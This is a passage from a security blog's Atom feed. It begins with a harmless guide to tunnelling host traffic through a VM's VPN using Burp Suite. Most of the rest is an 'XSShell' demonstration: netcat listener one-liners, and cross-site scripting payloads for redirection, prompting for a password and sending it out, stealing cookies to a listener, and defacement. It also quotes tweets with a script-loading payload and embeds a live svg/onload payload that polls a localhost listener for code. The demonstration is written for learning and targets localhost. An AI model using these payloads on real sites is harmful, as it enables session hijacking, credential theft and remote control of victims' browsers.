&lt;p&gt;One particular annoyance in my quest to keep a clean and tidy system is VPN. This is because when it comes to remote access into client environments, in the words of Roseanne Rosannadanna, &quot;It's always something.&quot; For example, the VPN client software doesn't work on OS X. The VPN requires host checking that isn't compatible with OS X. Every client uses a different VPN solution and software client, resulting in a dozen VPN clients residing on the same system and conflicting with one another. The end result is a delayed engagement and a mess of installed software.&lt;/p&gt;
&lt;p&gt;The way I address this issue is by using VMs to create compatible environments where I install everything that is needed for remote access. Easy enough, right? But now we're faced with the problem of having our favorite tools, some of which may be commercial or incompatible with the VM OS, configured and licensed on our host machine. It's one thing to tunnel a VM through a VPN on the host. That's a simple as configuring the VM interface in NAT, or shared mode. Tunneling a host through a VPN on the VM is another challenge altogether, and not as easily solved. Here's a step-by-step for how I approach the problem. Perhaps you'll find it useful in your daily struggles against VPN software clutter.&lt;/p&gt;
&lt;h3&gt;Update&lt;/h3&gt;
&lt;h5&gt;Tuesday, March 28, 2017&lt;/h5&gt;
&lt;p&gt;A co-worker and I were struggling through configuring Privoxy on a recent test when it hit me, &quot;Why not use Burp Suite Free as the proxy on the VM?&quot; So I started looking through the Burp Suite Free configuration and discovered some settings that allowed me to replace Privoxy with Burp Suite Free on the VM. There are several advantages to using Burp Suite Free over Privoxy. First, Burp Suite Free is a tool that we are familiar with. Second, Burp Suite Free is easier to install and configure than Privoxy. Finally, Burp Suite Free performs much better than Privoxy. There was a noticeable speed increase when I switched from Privoxy to Burp Suite Free. All this being said, below is a revised guide using Burp Suite Free as the proxy instead of Privoxy.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Configure a VM with the required VPN client software and configuration, and validate that it works.&lt;/li&gt;
&lt;li&gt;Shut down the VM and add a second network adapter to the VM.&lt;/li&gt;
&lt;li&gt;Configure network adapter 1 (original) as bridged mode.&lt;/li&gt;
&lt;li&gt;Configure network adapter 2 (new) as host-only mode.&lt;/li&gt;
&lt;li&gt;Start the VM and install Burp Suite Free. I prefer the installer to the stand-alone jar file, as it seems to be more stable and doesn't require a separate Java install.&lt;/li&gt;
&lt;li&gt;Configure the VM's Burp proxy to listen on all interfaces.&lt;/li&gt;
&lt;li&gt;Configure the VM's Burp Proxy to pass through SSL. This is fine, as we're not doing anything here but forwarding the Host OS's traffic to the VPN. We don't want this instance of Burp terminating TLS.&lt;/li&gt;
&lt;li&gt;Configure the VM's Burp Proxy to not record any traffic. We definitely don't need to waste resources by storing traffic we'll never use.&lt;/li&gt;
&lt;li&gt;Note the IP address of the host-only interface on the VM.&lt;/li&gt;
&lt;li&gt;Connect to the VPN on the VM.&lt;/li&gt;
&lt;li&gt;Configure Burp on the host with the host-only interface as an upstream proxy (IP address from step 9 and port from step 6).&lt;/li&gt;
&lt;li&gt;Profit. Man I hate it when people say this.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;See the &lt;a href=&quot;/burp-visual-aids/&quot;&gt;Burp Suite Visual Aids project page&lt;/a&gt; for a picture of what this configuration looks like.&lt;/p&gt;</content>
  </entry>
  <entry xml:base="https://www.lanmaster53.com/atom.xml">
    <title type="text">Fun with XSShell</title>
    <id>https://www.lanmaster53.com/2016/07/15/fun-with-xsshell</id>
    <updated>2016-07-15T00:00:00Z</updated>
    <published>2016-07-15T00:00:00Z</published>
    <link href="https://www.lanmaster53.com/2016/07/15/fun-with-xsshell" />
    <content type="html">&lt;p&gt;So this is kinda fun. With this page open, copy and paste one of the listener commands from below into a terminal window on your local machine. Then, paste &lt;code&gt;alert(42)&lt;/code&gt; into the resulting shell and press &quot;Enter&quot;. Once you recover from the initial shock of what you just witnessed, play with the following payloads and spend the next hour of life thoroughly enjoying yourself.&lt;/p&gt;
&lt;!-- READMORE --&gt;

&lt;h3&gt;Listeners&lt;/h3&gt;
&lt;h4&gt;Linux&lt;/h4&gt;
&lt;div class=&quot;codehilite&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;while :; do printf &amp;quot;j$ &amp;quot;; read c; printf &amp;quot;HTTP/1.1 200 OK\n\n$c&amp;quot; | nc -lp 8000 &amp;gt;/dev/null; done
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;OS X&lt;/h4&gt;
&lt;div class=&quot;codehilite&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;while :; do printf &amp;quot;j$ &amp;quot;; read c; printf &amp;quot;HTTP/1.1 200 OK\n\n$c&amp;quot; | nc -l 8000 &amp;gt;/dev/null; done
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Example Payloads&lt;/h3&gt;
&lt;h4&gt;Redirection&lt;/h4&gt;
&lt;div class=&quot;codehilite&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;window.location = &amp;#39;http://lanmaster53.com/training/&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Phishing&lt;/h4&gt;
&lt;div class=&quot;codehilite&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;i=new Image();i.src=&amp;quot;http://127.0.0.1:8888/pw/&amp;quot;+prompt(&amp;quot;Password:&amp;quot;)
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Requires a second listener, e.g. &lt;code&gt;python -m &quot;SimpleHTTPServer&quot; 8888&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Session Hijacking&lt;/h4&gt;
&lt;div class=&quot;codehilite&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;i=new Image();i.src=&amp;quot;http://127.0.0.1:8888/pw/&amp;quot;+document.cookie
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Requires a second listener, e.g. &lt;code&gt;python -m &quot;SimpleHTTPServer&quot; 8888&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Defacement&lt;/h4&gt;
&lt;div class=&quot;codehilite&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;d=document;e=d.createElement(&amp;quot;p&amp;quot;);e.innerHTML=&amp;quot;lanmaster53 wuz here!&amp;quot;;d.body.appendChild(e)
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Credits&lt;/h3&gt;
&lt;p&gt;This is all based on the code shared in the following tweets.&lt;/p&gt;
&lt;div class=&quot;row&quot;&gt;
&lt;div class=&quot;six columns&quot;&gt;
&lt;blockquote class=&quot;twitter-tweet tw-align-center&quot; data-conversation=&quot;none&quot; lang=&quot;en&quot;&gt;&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;XSShell - Target&lt;br&gt;&lt;br&gt;&amp;lt;svg/onload=setInterval(function(){d=document;z=d.createElement(&amp;quot;script&amp;quot;);z.src=&amp;quot;//HOST:PORT&amp;quot;;d.body.appendChild(z)},0)&amp;gt;&lt;/p&gt;&amp;mdash; Brute (@brutelogic) &lt;a href=&quot;https://twitter.com/brutelogic/status/639069519097503744&quot;&gt;September 2, 2015&lt;/a&gt;&lt;/blockquote&gt;
&lt;/div&gt;
&lt;div class=&quot;six columns&quot;&gt;
&lt;blockquote class=&quot;twitter-tweet tw-align-center&quot; data-conversation=&quot;none&quot; lang=&quot;en&quot;&gt;&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;XSShell - Attacker&lt;br&gt;&lt;br&gt;$ while :; do printf &amp;quot;j$ &amp;quot;; read c; echo &lt;a href=&quot;https://twitter.com/search?q=%24c&amp;amp;src=ctag&quot;&gt;$c&lt;/a&gt; | nc -lp PORT &amp;gt;/dev/null; done&lt;/p&gt;&amp;mdash; Brute (@brutelogic) &lt;a href=&quot;https://twitter.com/brutelogic/status/639073880922030080&quot;&gt;September 2, 2015&lt;/a&gt;&lt;/blockquote&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;script async src=&quot;//platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;

&lt;!-- attack payload --&gt;

&lt;p&gt;&lt;svg/onload=setInterval(function(){d=document;try{d.getElementById(&quot;x&quot;).remove()}catch(e){};z=d.createElement(&quot;script&quot;);z.id=&quot;x&quot;;z.src=&quot;http://127.0.0.1:8000&quot;;d.body.appendChild(z)},3000)&gt;&lt;/p&gt;
&lt;p&gt;Check the source code here ^^^ for the active payload.&lt;/p&gt;</content>
  </entry>
</feed>
